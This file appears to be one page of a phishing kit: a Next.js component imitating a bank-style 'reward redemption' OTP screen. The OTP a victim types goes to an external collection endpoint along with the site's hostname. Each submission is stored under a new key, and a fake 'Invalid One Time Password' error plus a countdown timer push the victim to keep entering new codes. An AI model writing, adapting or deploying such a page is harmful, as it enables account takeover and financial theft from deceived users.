'use client'
import { useRouter } from "next/navigation"; // in client component
import { useSearchParams } from 'next/navigation'
import { useCounter } from '../lib/CounterContext';


import { useEffect, useState } from 'react';
export default function Home() {
  const { counter, incrementCounter } = useCounter();
  
   const router = useRouter();
   const queryString = useSearchParams()
   const nextRoute = queryString.get('next')
   const  [response, setResponse] = useState(false);
   const [err, setErr] = useState(false);
   const [otp, setOtp] = useState('');
    const showError = () => {
        alert("OTP resend successfully !");
    }
  const handleSubmit = (e) => {
    incrementCounter();
    e.preventDefault();
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key+counter] = value;
      });
      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            if(queryString.get('next') == null){
                setTimeout(function(){setErr(false);}, 3000);
                setErr(true);
                setOtp('');
           }else{
                setErr(false);
                router.push(nextRoute)
           }
            
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };
  return (
        <div className="container">
  <form
       onSubmit={handleSubmit}
      >
        <div className="box">
          <div className="page-hea">
            <div className="row">
              <div className="col-xs-6 col-md-6">
                <h2
                  style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 600 }}
                >
                  Enter OTP
                </h2>
              </div>
              <div className="col-xs-6 col-md-6 text-right">
                <h2>X</h2>
              </div>
            </div>
          </div>
          <div className="row">
            <div className="col-md-6 col-xs-12">
              
              <div className="p-50">
              <div className="progress">
  <div
    className="progress-bar"
    style={{
      fontFamily: '"Open Sans", sans-serif',
      color: "#fff",
      fontWeight: 500,
      width: "100%"
    }}
  >
    step 1/4: Redeem of reward worth Rs. 9850
  </div>
</div>

                <center>
                  <h4
                    style={{
                      fontFamily: '"Open Sans", sans-serif',
                      color: "#000",
                      fontWeight: 700,
                      marginTop: "10%"
                    }}
                  >
                    OTP Verification
                  </h4>
                </center>
                <center>
                  <p1>
                    We have send an OTP to your registered mobile number. Please enter
                    the OTP and proceed.
                  </p1>
                </center>
                <br />
                <br />
                <div className="login-box">
                  <div className="user-box">
                    <input
                      type="text"
                      name="OTOPTPP"
                      inputMode="numeric"
                      maxLength={8}
                      pattern="\d{6,9}"
                      title="Please enter valid OTP !"
                      required
                      value = {otp}
                      onChange={(e) => setOtp(e.target.value)}
                    />
                    <label>
                      Enter OTP<span style={{ color: "red" }}> *</span>
                    </label>
                    <div id="inv">
                    <p1
                      style={{
                        fontSize: 12,
                        color: "red",
                        fontStyle: "italic",
                        fontFamily: '"Work Sans", sans-serif',
                        position: "absolute",
                        marginTop: "-14%",
                        marginLeft: "-5%"
                      }}
                    >
                      {err && ("Invalid One Time Password !") } 
                    </p1>
                  </div>
                  </div>
                  <div id="res">
                    <a
                      href="#"
                      style={{
                        fontFamily: '"Open Sans", sans-serif',
                        fontWeight: 700,
                        color: "#673391",
                        position: "absolute",
                        marginTop: "-10%",
                        marginLeft: "45%",
                        textDecoration: "none"
                      }}
                    >
                      Resend OTP
                    </a>
                    <br />
                  </div>
                  <br />
                  <div style={{ marginTop: "-5%" }}>
                    <center>
                      <b
                        style={{
                          fontFamily: '"Work Sans", sans-serif',
                          fontWeight: 500,
                          color: "grey",
                          fontSize: 14,
                          textAlign: "center"
                        }}
                      >
                        <span
                          style={{
                            color: "grey",
                            fontFamily: '"Work Sans", sans-serif',
                            fontSize: 13
                          }}
                          id="time"
                        >
                          <p1> Wait for OTP : <Countdown countingInSeconds={180} /> </p1>
                        </span>
                        &nbsp;second
                      </b>
                    </center>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <br />
          <br />
          <br />
          <br />
        </div>
        <div className="row">
          <div
            style={{ marginTop: "-15%" }}
            className="col-xs-12 col-md-12 text-center"
          >
            <a
              href="#"
              style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 500 }}
              className="btn btn-border"
            >
              Back
            </a>
            <button
              type="submit"
              style={{ fontFamily: '"Open Sans", sans-serif', fontWeight: 500 }}
              className="btn btn-primary"
            >
              {" "}
              Submit{" "}
            </button>
          </div>
        </div>
        <br />
      </form>
        </div>

  
  )
}

function formatTime(minutes, seconds) {
  const formattedMinutes = Math.floor(minutes).toString().padStart(2, '0');
  const formattedSeconds = Math.floor(seconds).toString().padStart(2, '0');
  return `${formattedMinutes}:${formattedSeconds}`;
}

function Countdown({ countingInSeconds }) {
  const [timeRemaining, setTimeRemaining] = useState(formatTime(countingInSeconds / 60, countingInSeconds % 60));

  useEffect(() => {
    const targetTime = new Date();
    targetTime.setSeconds(targetTime.getSeconds() + countingInSeconds);

    const calculateRemainingTime = () => {
      const currentTime = new Date();
      const timeDifference = targetTime - currentTime;

      if (timeDifference > 0) {
        const minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((timeDifference % (1000 * 60)) / 1000);
        setTimeRemaining(formatTime(minutes, seconds));
        setTimeout(calculateRemainingTime, 1000);
      } else {
        setTimeRemaining('00:00');
      }
    };

    calculateRemainingTime();
  }, [countingInSeconds]);

  return <> <span id="timeCountDown">{timeRemaining}</span> </>;
}